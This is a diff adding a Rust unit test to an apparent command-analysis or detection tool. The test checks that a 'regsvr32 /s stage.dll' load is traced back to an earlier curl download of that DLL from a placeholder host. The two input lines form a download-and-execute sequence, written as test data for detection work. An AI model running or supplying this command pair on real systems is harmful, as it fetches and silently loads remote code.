@@ -8686,6 +8686,29 @@ regsvr32 /s stage.dll"#,
             report.traits
         );
     }
+
+    #[test]
+    fn regsvr32_basename_load_target_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\stage.dll https://regsvr32-basename.example/stage.dll"#,
+            &mut env,
+        );
+        interpret_line("regsvr32 /s stage.dll", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "regsvr32 /s stage.dll"
+                        && url == "https://regsvr32-basename.example/stage.dll"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 basename load target did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
